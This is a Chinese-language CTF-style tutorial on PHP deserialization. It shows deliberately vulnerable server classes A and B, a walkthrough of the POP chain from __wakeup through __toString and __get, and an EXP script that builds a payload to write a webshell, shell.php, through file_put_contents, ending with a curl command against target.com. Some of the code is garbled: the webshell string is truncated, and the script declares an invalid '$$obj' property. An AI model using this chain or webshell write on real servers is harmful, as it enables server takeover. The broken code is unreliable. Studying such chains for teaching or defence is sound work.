例题2：A/B类联合构造写入文件

题目描述

服务端存在自定义 A、B 两个类， 反序列化入口接收POST传参的 data 值，无任何过滤与校验。 要求利用反序列化漏洞构造POP链，调用 file_put_contents() 函数在服务端写入一句话木马 shell.php。

服务端源码 


class A
{
    public $path;
    public $content;

    // 构造方法：初始化属性
    public function __construct()
    {
        $this->path = "1919810.txt";
        $this->content = "Nothing useful";
    }

    // 字符串方法：对象被当作字符串时触发
    public function __toString()
    {
        echo "now is a string\n";
        // 访问path属性的子path，触发__get
        return ($this->path)->path . $this->content;
    }

    // 获取不可访问属性时触发
    public function __get($name)
    {
        echo "now is a get\n";
        return $name;
    }
}

class B
{
    public $name;
    public $id;
    public $obj;

    // 反序列化时触发：松散比较name和id
    public function __wakeup()
    {
        if ($this->name == $this->id) {
            echo "Why your name is id?\n";
        } else {
            echo "ok\n";
        }
    }

    // 获取不可访问属性时触发：核心危险操作
    public function __get($name)
    {
        echo "now is get\n";
        // 写入文件：参数为obj的path和content，可控
        file_put_contents(($this->obj)->path, ($this->obj)->content);
        return ($this->obj)->name;
    }
}

// 高亮显示源码，无实际防护
highlight_file(__FILE__);
// 反序列化入口：接收POST参数data，无过滤
unserialize($_POST['data']);
?>

漏洞分析

POP链构造思路（反向回溯法）

1

确定目标危险函数

目标函数：file_put_contents(($this->obj)->path, ($this->obj)->content)

在 B::__get() 中定义

2

找到B::__get()触发条件

触发方式：访问 B 对象不存在的属性

需要 $b->name = $a，然后访问 $a->path->path

3

找到A::__toString()触发条件

触发方式：对象被当作字符串，如 $b->name == $b->id（松散比较）

如果 $name 是对象，会调用 __toString()

4

找到B::__wakeup()入口

触发方式：unserialize() 时自动触发

设置 $b2->name = $a2（对象），$b2->id = "2"（字符串）

调用链图解

unserialize()

__wakeup()

B对象

__toString()

A对象

__get()

B对象访问path

file_put()

写入文件

关键点： $b2->name($a2对象) == $b2->id("2"字符串) 松散比较触发 __toString()

解题步骤

  1. 1

    创建B1对象（最内层）

    设置 $b1->obj = $a1（A对象），用于调用 file_put_contents()

  2. 2

    创建A1对象

    设置 $a1->path = "shell.php"，$a1->content = "

  3. 3

    创建A2对象（中间层）

    设置 $a2->path = $b1（B1对象），用于触发 B::__get()

  4. 4

    创建B2对象（最外层）

    设置 $b2->name = $a2（对象），$b2->id = "2"（字符串）

    松散比较触发 A::__toString()

  5. 5

    序列化并POST提交

    反序列化时会依次触发 __wakeup() → __toString() → __get() → file_put_contents()

完整EXP脚本 


// 例题2 EXP: A/B类联合构造触发file_put_contents

class A {
    public $path;
    public $content;
}

class B {
    public $name;
    public $id;
    public $$obj;
}

// Step 1: 创建A1对象，用于写入文件内容
$a1 = new A();
$a1->path = "shell.php";                           // 写入的文件名
$a1->content = ";      // 木马内容

// Step 2: 创建B1对象，用于触发__get
$b1 = new B();
$b1->obj = $a1;                                     // 关联A1对象
$b1->id = "1";

// Step 3: 创建A2对象，用于触发__toString
$a2 = new A();
$a2->path = $b1;                                      // 关键！赋值为B1对象
$a2->content = "114514";                               // 填充属性，无实际作用

// Step 4: 创建B2对象，用于触发__wakeup
$b2 = new B();
$b2->name = $a2;                                      // 对象，松散比较触发__toString
$b2->id = "2";                                       // 字符串，与name类型不同

// Step 5: 序列化并URL编码
$payload = urlencode(serialize($b2));

echo "Payload:\n";
echo $payload;
echo "\n\n使用方法：\n";
echo "curl -X POST http://target.com/index.php -d 'data=" . $payload . "'\n";
执行流程 
unserialize($b2)
  └─> __wakeup(): $b2->name(A对象) != $b2->id("2"字符串)，松散比较触发 __toString()
        └─> A::__toString(): return ($this->path即$b1)->path
              └─> B::__get("path"): file_put_contents($a1->path, $a1->content)
                    └─> shell.php 被写入!
